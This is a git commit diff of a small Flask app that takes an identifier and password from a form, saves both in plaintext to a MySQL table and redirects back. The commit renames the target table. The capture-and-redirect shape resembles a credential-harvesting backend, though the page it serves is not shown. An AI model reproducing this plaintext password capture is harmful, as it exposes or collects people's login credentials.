6e3460b4f0e1b30e535706d8a8527aa4eb266c7b
wakxzz <jacklaverie01@gmail.com>
2026-05-01 22:07:42 +0200

    use utilisateurs2

--- app.py
+++ app.py
@@ -1,9 +1,9 @@
-from flask import Flask, request, redirect, send_from_directory
+from flask import Flask, request, redirect
 import mysql.connector
 import os
-
+ 
 app = Flask(__name__, static_folder='.', static_url_path='')
-
+ 
 def get_db():
     return mysql.connector.connect(
         host=os.environ.get('MYSQLHOST'),
@@ -12,24 +12,25 @@ def get_db():
         user=os.environ.get('MYSQLUSER'),
         password=os.environ.get('MYSQLPASSWORD')
     )
-
+ 
 @app.route('/')
 def index():
     return app.send_static_file('main.html')
-
+ 
 @app.route('/save', methods=['POST'])
 def save():
     identifier = request.form.get('identifier', '')
     password   = request.form.get('password', '')
-
+ 
     db  = get_db()
     cur = db.cursor()
-    cur.execute("INSERT INTO utilisateurs (identifier, mot_de_passe) VALUES (%s, %s)", (identifier, password))
+    cur.execute("INSERT INTO utilisateurs2 (identifier, mot_de_passe) VALUES (%s, %s)", (identifier, password))
     db.commit()
     cur.close()
     db.close()
-
+ 
     return redirect('/')
-
+ 
 if __name__ == '__main__':
     app.run(debug=True, port=8000)
+ 
